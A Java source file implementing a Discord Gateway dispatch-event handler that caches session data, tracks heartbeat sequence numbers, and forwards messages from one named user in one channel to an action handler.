package me.trojan.socket.websocket.eventReceived.gatewayEvents;

import com.google.gson.JsonObject;
import me.trojan.socket.websocket.Cache;
import me.trojan.socket.websocket.actionsToPerform.ActionHandler;
import me.trojan.socket.websocket.eventReceived.DiscordGatewayEvent;

public class DispatchEvent implements DiscordGatewayEvent {
    /**
     * The JSON Object received from the Discord Gateway API.
     */
    private final JsonObject jsonObj;

    public DispatchEvent(JsonObject jsonObj) {
        this.jsonObj = jsonObj;
    }

    @Override
    public void handleEvent() {
        checkForNewSequenceNumber();

        if(jsonObj.has("t")) {
            String event = jsonObj.get("t").getAsString();
            if (event.equals("READY")) {
                Cache.resumeGatewayURL = jsonObj.get("d").getAsJsonObject().get("resume_gateway_url").getAsString();
                Cache.sessionID = jsonObj.get("d").getAsJsonObject().get("session_id").getAsString();
            }
            if (event.equals("MESSAGE_CREATE")) {
                JsonObject d = jsonObj.get("d").getAsJsonObject();
                String content = d.get("content").getAsString();
                String authorName = d.get("author").getAsJsonObject().get("username").getAsString();
                String channelID = d.get("channel_id").getAsString();

                if (authorName.equals("Trojan") && channelID.equals("1074381633899208744")) {
                    ActionHandler actionHandler = new ActionHandler(content);
                    actionHandler.handleAction();
                }
            }
        }
    }

    /**
     * Check if a sequence key is available, if yes, assign it to the lastSequence int in Cache.java
     * This sequence key is used as third parameter in Heartbeat payload, if available.
     */
    private void checkForNewSequenceNumber() {
        if(jsonObj.has("s")) {
            String sequence = jsonObj.get("s").getAsString();
            if(!sequence.equals("")) {
                try {
                    Cache.lastSequence = Integer.parseInt(sequence);
                } catch(NumberFormatException e) {
                    System.out.println("Couldn't parse sequence number as int.");
                }
            }
        }
    }
}
